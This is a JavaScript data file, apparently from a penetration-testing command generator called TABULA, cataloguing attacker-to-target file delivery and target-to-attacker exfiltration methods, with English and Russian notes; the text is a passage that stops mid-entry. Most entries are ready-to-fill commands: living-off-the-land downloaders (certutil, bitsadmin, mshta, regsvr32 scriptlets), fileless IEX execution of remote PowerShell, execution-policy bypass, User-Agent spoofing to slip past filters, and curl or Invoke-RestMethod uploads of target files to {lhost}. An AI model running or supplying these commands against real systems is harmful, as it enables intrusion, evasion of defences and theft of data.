/* Static method catalogue for TABULA.
 * Order inside a channel: direction -> family order (see tools.js) -> priority.
 * Every entry declares a channel, a family, and a stable priority.
 */
window.TABULA_METHODS = [
  {
    "id": "bash-devtcp",
    "title": "bash /dev/tcp",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "bash -c \"exec 3<>/dev/tcp/{lhost}/{lport}; printf 'GET /{file} HTTP/1.0\\r\\nHost: {lhost}\\r\\nConnection: close\\r\\n\\r\\n' >&3; sed '1,/^\\r\\{0,1\\}$/d' <&3 > \\\"{remotefile}\\\"; exec 3<&-\""
      }
    ],
    "requires": [
      "bash"
    ],
    "note": {
      "en": "No HTTP client on the target: bash opens the socket itself. The sed step strips the HTTP response headers before writing the file. /dev/tcp is a bash feature, not POSIX sh.",
      "ru": "HTTP-клиента на цели нет: bash сам открывает сокет. Шаг sed вырезает HTTP-заголовки перед записью файла. /dev/tcp есть в bash, но не в POSIX sh."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "shell",
    "priority": 10
  },
  {
    "id": "certutil",
    "title": "certutil",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "certutil -urlcache -split -f http://{lhost}:{lport}/{file} {remotefile}"
      }
    ],
    "requires": [
      "certutil"
    ],
    "note": {
      "en": "Present on default Windows builds. If it is blocked, use curl.exe or the PowerShell method.",
      "ru": "Есть на стандартных сборках Windows. Если заблокирован, используйте curl.exe или PowerShell."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "lolbin",
    "priority": 10
  },
  {
    "id": "iwr",
    "title": "Invoke-WebRequest",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "iwr \"http://{lhost}:{lport}/{file}\" -OutFile \"{remotefile}\""
      }
    ],
    "requires": [
      "PowerShell"
    ],
    "note": {
      "en": "In PowerShell, curl and wget are aliases. Use iwr or curl.exe explicitly.",
      "ru": "В PowerShell curl и wget являются алиасами. Используйте iwr или curl.exe явно."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "powershell",
    "priority": 10
  },
  {
    "id": "python3",
    "title": "python3 urllib",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{lhost}:{lport}/{file}', '{remotefile}')\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Useful when curl and wget are absent but Python is present.",
      "ru": "Полезно, когда curl и wget отсутствуют, но есть Python."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "interpreter",
    "priority": 10
  },
  {
    "id": "wget",
    "title": "wget",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "wget \"http://{lhost}:{lport}/{file}\" -O \"{remotefile}\""
      }
    ],
    "requires": [
      "wget"
    ],
    "note": {
      "en": "The simplest Linux path when wget is present. curl is an equivalent fallback.",
      "ru": "Самый простой путь для Linux, если есть wget. curl - равнозначный fallback."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "native",
    "priority": 10
  },
  {
    "id": "start-bitstransfer",
    "title": "Start-BitsTransfer",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "powershell",
    "priority": 15,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "Start-BitsTransfer -Dynamic -Source \"http://{lhost}:{lport}/{file}\" -Destination \"{remotefile}\""
      }
    ],
    "requires": [
      "PowerShell",
      "BITS"
    ],
    "note": {
      "en": "The PowerShell form of BITS. -Dynamic is required against python3 -m http.server; omit it only when the server supports Range requests.",
      "ru": "PowerShell-вариант BITS. -Dynamic нужен для python3 -m http.server; убирайте только если сервер поддерживает Range-запросы."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "curl-linux",
    "title": "curl",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "curl -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "curl"
    ],
    "note": {
      "en": "A standard Linux fallback. Use -k only on lab hosts with self-signed certificates.",
      "ru": "Стандартный fallback для Linux. Используйте -k только на лабораторных хостах с самоподписанным сертификатом."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "native",
    "priority": 20
  },
  {
    "id": "curl-win",
    "title": "curl.exe",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe -o \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "curl.exe"
    ],
    "note": {
      "en": "Modern Windows ships curl.exe. In PowerShell, curl without .exe is an alias for Invoke-WebRequest.",
      "ru": "Современная Windows поставляется с curl.exe. В PowerShell curl без .exe - алиас Invoke-WebRequest."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "native",
    "priority": 20
  },
  {
    "id": "irm",
    "title": "Invoke-RestMethod",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "irm \"http://{lhost}:{lport}/{file}\" -OutFile \"{remotefile}\""
      }
    ],
    "requires": [
      "PowerShell"
    ],
    "note": {
      "en": "The REST-style PowerShell variant. In PowerShell, curl is an alias; use irm or curl.exe explicitly.",
      "ru": "REST-вариант PowerShell. В PowerShell curl - алиас; используйте irm или curl.exe явно."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "powershell",
    "priority": 20
  },
  {
    "id": "perl-download",
    "title": "Perl LWP",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "perl -e 'use LWP::Simple; getstore(\"http://{lhost}:{lport}/{file}\", \"{remotefile}\");'"
      }
    ],
    "requires": [
      "perl",
      "LWP::Simple"
    ],
    "note": {
      "en": "Downloads a file with Perl LWP::Simple. Useful when wget and curl are absent.",
      "ru": "Скачивает файл через Perl LWP::Simple. Полезно, когда нет wget и curl."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "interpreter",
    "priority": 20
  },
  {
    "id": "busybox-download",
    "title": "busybox wget",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "busybox wget \"http://{lhost}:{lport}/{file}\" -O \"{remotefile}\""
      }
    ],
    "requires": [
      "busybox"
    ],
    "note": {
      "en": "Downloads a file with busybox wget. Common on routers, IoT, and Alpine.",
      "ru": "Скачивает файл через busybox wget. Часто есть на роутерах, IoT и Alpine."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "native",
    "priority": 30
  },
  {
    "id": "webclient",
    "title": "Net.WebClient",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "(New-Object Net.WebClient).DownloadFile(\"http://{lhost}:{lport}/{file}\",\"{remotefile}\")"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "A classic .NET downloader. It is a good fallback when Invoke-WebRequest is restricted.",
      "ru": "Классический .NET-загрузчик. Хороший fallback, если Invoke-WebRequest ограничен."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "powershell",
    "priority": 30
  },
  {
    "id": "php-download",
    "title": "PHP file_get_contents",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "php -r 'file_put_contents(\"{remotefile}\", file_get_contents(\"http://{lhost}:{lport}/{file}\"));'"
      }
    ],
    "requires": [
      "php"
    ],
    "note": {
      "en": "Downloads a file with PHP file_get_contents and file_put_contents.",
      "ru": "Скачивает файл через PHP file_get_contents и file_put_contents."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "interpreter",
    "priority": 30
  },
  {
    "id": "wget-win",
    "title": "wget.exe",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "wget.exe -q -O \"{remotefile}\" \"http://{lhost}:{lport}/{file}\""
      }
    ],
    "requires": [
      "wget.exe"
    ],
    "note": {
      "en": "Downloads a file with Windows wget.exe. It is not built in; check for it first and fall back to certutil or curl.exe.",
      "ru": "Скачивает файл через Windows wget.exe. Он не встроен; проверьте наличие и используйте certutil или curl.exe как fallback."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "native",
    "priority": 30
  },
  {
    "id": "bitsadmin",
    "title": "bitsadmin",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "bitsadmin /transfer job /download /priority high /dynamic http://{lhost}:{lport}/{file} \"{remotefile}\""
      }
    ],
    "requires": [
      "bitsadmin"
    ],
    "note": {
      "en": "Downloads a file with BITS from a Python HTTP server. /dynamic is needed when the server does not support Range requests.",
      "ru": "Скачивает файл через BITS с Python HTTP-сервера. /dynamic нужен, если сервер не поддерживает Range-запросы."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "lolbin",
    "priority": 40
  },
  {
    "id": "webrequest",
    "title": "Net.WebRequest",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "$w=[Net.WebRequest]::Create(\"http://{lhost}:{lport}/{file}\");$r=$w.GetResponse();$s=$r.GetResponseStream();$f=[IO.File]::Create(\"{remotefile}\");$s.CopyTo($f);$f.Close();$s.Close()"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "Low-level .NET streaming. Useful when higher-level cmdlets are blocked by policy.",
      "ru": "Низкоуровневый .NET-стриминг. Полезно, когда высокоуровневые cmdlet заблокированы политикой."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "powershell",
    "priority": 40
  },
  {
    "id": "ruby-download",
    "title": "Ruby Net::HTTP",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "ruby -e 'require \"net/http\"; File.write(\"{remotefile}\", Net::HTTP.get(URI(\"http://{lhost}:{lport}/{file}\")))'"
      }
    ],
    "requires": [
      "ruby"
    ],
    "note": {
      "en": "Downloads a file with Ruby Net::HTTP. Common on development hosts.",
      "ru": "Скачивает файл через Ruby Net::HTTP. Часто есть на dev-хостах."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "interpreter",
    "priority": 40
  },
  {
    "id": "bitsadmin-ruby",
    "title": "bitsadmin + Ruby",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && ruby -run -e httpd . -p {lport}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "bitsadmin /transfer job /download /priority high http://{lhost}:{lport}/{file} \"{remotefile}\""
      }
    ],
    "requires": [
      "bitsadmin",
      "ruby"
    ],
    "note": {
      "en": "Downloads a file with BITS from Ruby WEBrick. WEBrick supports Range, so /dynamic is not needed.",
      "ru": "Скачивает файл через BITS с Ruby WEBrick. WEBrick поддерживает Range, поэтому /dynamic не нужен."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "lolbin",
    "priority": 50
  },
  {
    "id": "node-download",
    "title": "Node.js http",
    "profiles": [
      "core"
    ],
    "os": "linux",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "bash",
        "text": "node -e 'require(\"http\").get(\"http://{lhost}:{lport}/{file}\", r => r.pipe(require(\"fs\").createWriteStream(\"{remotefile}\")))'"
      }
    ],
    "requires": [
      "node"
    ],
    "note": {
      "en": "Downloads a file with the Node.js http module and streams it to disk.",
      "ru": "Скачивает файл через модуль http в Node.js и пишет его на диск потоком."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "interpreter",
    "priority": 50
  },
  {
    "id": "webclient-proxy",
    "title": "WebClient + proxy",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "deliver",
    "source": "01",
    "server": {
      "shell": "bash",
      "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "$wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $wc.DownloadFile(\"http://{lhost}:{lport}/{file}\",\"{remotefile}\")"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "Uses the system proxy and default credentials. Common in corporate lab networks.",
      "ru": "Использует системный прокси и учётные данные по умолчанию. Часто встречается в корпоративных лабораториях."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "channel": "http",
    "family": "powershell",
    "priority": 50
  },
  {
    "id": "iwr-useragent",
    "title": "iwr + browser User-Agent",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "powershell",
    "priority": 60,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "iwr \"http://{lhost}:{lport}/{file}\" -OutFile \"{remotefile}\" -UserAgent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36\""
      }
    ],
    "requires": [
      "PowerShell"
    ],
    "note": {
      "en": "Some filters block on the default PowerShell User-Agent. This sends a browser one.",
      "ru": "Некоторые фильтры блокируют стандартный User-Agent PowerShell. Здесь отправляется браузерный."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "powershell-ep-bypass",
    "title": "PowerShell -ep bypass",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "powershell",
    "priority": 65,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "powershell -ep bypass -c \"iwr http://{lhost}:{lport}/{file} -OutFile '{remotefile}'\""
      }
    ],
    "requires": [
      "PowerShell"
    ],
    "note": {
      "en": "Runs from cmd and bypasses the execution policy for this process only.",
      "ru": "Запускается из cmd и обходит execution policy только для этого процесса."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "fileless-iex",
    "title": "Fileless IEX",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "powershell",
    "priority": 70,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "IEX(New-Object Net.WebClient).DownloadString(\"http://{lhost}:{lport}/{file}\")"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "Downloads and runs a PowerShell script in memory. The generator automatically uses **payload.ps1**, not payload.exe; put that **.ps1** in the LHOST directory. No output file is written and the payload does not touch disk.",
      "ru": "Скачивает и запускает PowerShell-скрипт в памяти. Генератор автоматически использует **payload.ps1**, а не payload.exe; положите этот **.ps1** в каталог LHOST. Выходной файл не создаётся, payload не пишется на диск."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "fileExt": "ps1",
    "helpers": [
      {
        "name": "payload.ps1",
        "text": "# payload.ps1 - replace with your script\nWrite-Host \"[+] payload.ps1 executed\"\n",
        "side": "lhost"
      }
    ]
  },
  {
    "id": "mshta-remote",
    "title": "mshta (remote HTA)",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "lolbin",
    "priority": 70,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "mshta http://{lhost}:{lport}/{file}"
      }
    ],
    "requires": [
      "mshta"
    ],
    "note": {
      "en": "The URL must return an .hta file, not a PE/.exe. The generator automatically uses **payload.hta**; ready-to-use template: **scripts/payload.hta**. The HTA also runs the script inside it.",
      "ru": "URL должен отдавать .hta файл, а не PE/.exe. Генератор автоматически использует **payload.hta**; готовый шаблон: **scripts/payload.hta**. HTA также выполнит скрипт внутри."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "fileExt": "hta",
    "helpers": [
      {
        "name": "payload.hta",
        "text": "<!DOCTYPE html>\n<html>\n<head>\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<HTA:APPLICATION ID=\"oHTA\" APPLICATIONNAME=\"payload\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" />\n<script language=\"VBScript\">\n  CreateObject(\"WScript.Shell\").Run \"calc\"\n  window.close\n</script>\n</head>\n<body>\n</body>\n</html>",
        "side": "lhost"
      }
    ]
  },
  {
    "id": "regsvr32-sct",
    "title": "regsvr32 SCT (Squiblydoo)",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "lolbin",
    "priority": 75,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "regsvr32 /s /n /u /i:http://{lhost}:{lport}/{file} scrobj.dll"
      }
    ],
    "requires": [
      "regsvr32",
      "scrobj.dll",
      "SCT XML"
    ],
    "note": {
      "en": "The URL must return an SCT scriptlet XML, not a PE/.exe. The generator automatically uses **payload.sct**; ready-to-use template: **scripts/payload.sct**. An .exe starts with MZ and regsvr32 fails with \"Unexpected text ... MZ\".",
      "ru": "URL должен отдавать SCT-скриптлет (XML), а не PE/.exe. Генератор автоматически использует **payload.sct**; готовый шаблон: **scripts/payload.sct**. .exe начинается с MZ, и regsvr32 падает с \"Unexpected text ... MZ\"."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "fileExt": "sct",
    "helpers": [
      {
        "name": "payload.sct",
        "text": "<?xml version=\"1.0\"?>\n<scriptlet>\n  <registration progid=\"p\" classid=\"{00000000-0000-0000-0000-000000000000}\"></registration>\n  <script language=\"JScript\">\n    <![CDATA[ new ActiveXObject(\"WScript.Shell\").Run(\"calc\"); ]]>\n  </script>\n</scriptlet>",
        "side": "lhost"
      }
    ]
  },
  {
    "id": "desktopimgdownldr",
    "title": "desktopimgdownldr",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "lolbin",
    "priority": 80,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "desktopimgdownldr.exe /lockscreenurl:http://{lhost}:{lport}/{file} /eventName:foo"
      }
    ],
    "requires": [
      "desktopimgdownldr.exe"
    ],
    "note": {
      "en": "Drops the file into **%SystemRoot%\\Personalization\\LockScreenImage** and changes the lock screen. It writes **HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP** values **LockScreenImageUrl**, **LockScreenImagePath**, **LockScreenImageStatus**. Those registry values persist after the run; remove them and restore the previous lock screen. Often needs Administrator for the HKLM write; lab only.",
      "ru": "Кладёт файл в **%SystemRoot%\\Personalization\\LockScreenImage** и меняет экран блокировки. Пишет в **HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP** значения **LockScreenImageUrl**, **LockScreenImagePath**, **LockScreenImageStatus**. Эти значения остаются в реестре после запуска — удалите их и верните прежний экран блокировки. Для записи в HKLM часто нужен Administrator; только лаборатория."
    },
    "docs": "docs/en/01-attacker-to-target.md"
  },
  {
    "id": "vbscript-wget",
    "title": "VBScript downloader",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "script",
    "priority": 80,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "cscript.exe /nologo wget.vbs http://{lhost}:{lport}/{file} \"{remotefile}\""
      }
    ],
    "requires": [
      "cscript.exe",
      "wget.vbs"
    ],
    "note": {
      "en": "Downloads a URL with cscript. Create **wget.vbs** from the helper block above on RHOST, then pass the URL and destination path.",
      "ru": "Скачивает URL через cscript. Создайте **wget.vbs** из блока выше на RHOST, затем передайте URL и путь назначения."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "helpers": [
      {
        "name": "wget.vbs",
        "text": "dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n  .type = 1\n  .open\n  .write xHttp.responseBody\n  .savetofile WScript.Arguments.Item(1), 2\nend with",
        "side": "rhost"
      }
    ]
  },
  {
    "id": "javascript-wget",
    "title": "JavaScript downloader",
    "profiles": [
      "core",
      "lolbins",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "http",
    "family": "script",
    "priority": 85,
    "source": "01",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "cd {lhostpath} && python3 -m http.server {lport} --bind 0.0.0.0"
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "cscript.exe /nologo wget.js http://{lhost}:{lport}/{file} \"{remotefile}\""
      }
    ],
    "requires": [
      "cscript.exe",
      "wget.js"
    ],
    "note": {
      "en": "Downloads a URL with cscript. Create **wget.js** from the helper block above on RHOST, then pass the URL and destination path.",
      "ru": "Скачивает URL через cscript. Создайте **wget.js** из блока выше на RHOST, затем передайте URL и путь назначения."
    },
    "docs": "docs/en/01-attacker-to-target.md",
    "helpers": [
      {
        "name": "wget.js",
        "text": "var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));",
        "side": "rhost"
      }
    ]
  },
  {
    "id": "curl-exfil",
    "title": "curl raw POST",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "02",
    "server": {
      "shell": "bash",
      "text": "python3 serv.py -p {lport} -d {lhostpath}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "curl.exe --data-binary \"@{remotefile}\" \"http://{lhost}:{lport}/upload?file={file}\""
      }
    ],
    "requires": [
      "curl.exe",
      "serv.py"
    ],
    "note": {
      "en": "The receiver prints the saved path and SHA-256. Start it in /tmp/share or pass -d.",
      "ru": "Приёмник печатает путь и SHA-256. Запускайте его в /tmp/share или передайте -d."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "servpy",
    "family": "native",
    "priority": 10
  },
  {
    "id": "irm-exfil",
    "title": "Invoke-RestMethod raw POST",
    "profiles": [
      "core"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "02",
    "server": {
      "shell": "bash",
      "text": "python3 serv.py -p {lport} -d {lhostpath}"
    },
    "client": [
      {
        "shell": "powershell",
        "text": "Invoke-RestMethod -Uri \"http://{lhost}:{lport}/upload?file={file}\" -Method Post -InFile \"{remotefile}\" -ContentType \"application/octet-stream\""
      }
    ],
    "requires": [
      "PowerShell",
      "serv.py"
    ],
    "note": {
      "en": "Sends the file as a raw body. Invoke-RestMethod -InFile is not multipart.",
      "ru": "Отправляет файл как raw body. Invoke-RestMethod -InFile - это не multipart."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "servpy",
    "family": "powershell",
    "priority": 10
  },
  {
    "id": "certreq",
    "title": "certreq -Post (CSR only)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "02",
    "server": {
      "shell": "bash",
      "text": "python3 serv.py -p {lport} -d {lhostpath}"
    },
    "client": [
      {
        "shell": "cmd",
        "text": "certreq.exe -Post -config http://{lhost}:{lport}/ \"{remotefile}\""
      }
    ],
    "requires": [
      "certreq",
      "serv.py",
      "valid CSR"
    ],
    "note": {
      "en": "Niche bypass: sends a valid CSR to the configured endpoint. serv.py stores the raw POST body; it is not a CA and will not issue a certificate.",
      "ru": "Нишевый обход: отправляет валидный CSR на указанный endpoint. serv.py просто сохраняет тело POST; это не CA и сертификат он не выдаёт."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "servpy",
    "family": "lolbin",
    "priority": 20,
    "fileExt": "req",
    "warning": {
      "en": "**certreq -Post only accepts a certificate request (CSR), not a ZIP or EXE.** A normal file fails with `ERROR_ARITHMETIC_OVERFLOW (0x80070216)`. For ordinary files use curl raw POST or Invoke-RestMethod.",
      "ru": "**certreq -Post принимает только запрос на сертификат (CSR), а не ZIP или EXE.** Обычный файл падает с `ERROR_ARITHMETIC_OVERFLOW (0x80070216)`. Для обычных файлов используйте curl raw POST или Invoke-RestMethod."
    }
  },
  {
    "id": "certutil-b64",
    "title": "certutil base64 + curl",
    "profiles": [
      "core",
      "lolbins"
    ],
    "os": "windows",
    "direction": "exfil",
    "source": "02",
    "requires": [
      "certutil",
      "curl.exe"
    ],
    "note": {
      "en": "Certutil turns the file into base64 with PEM headers, curl uploads it as a raw body, and the final LHOST step strips the headers and decodes the original file.",
      "ru": "Certutil превращает файл в base64 с PEM-заголовками, curl отправляет его как raw body, а финальный шаг на LHOST снимает заголовки и декодирует исходный файл."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "servpy",
    "family": "lolbin",
    "priority": 30,
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 serv.py -p {lport} -d {lhostpath}"
      },
      {
        "side": "rhost",
        "shell": "cmd",
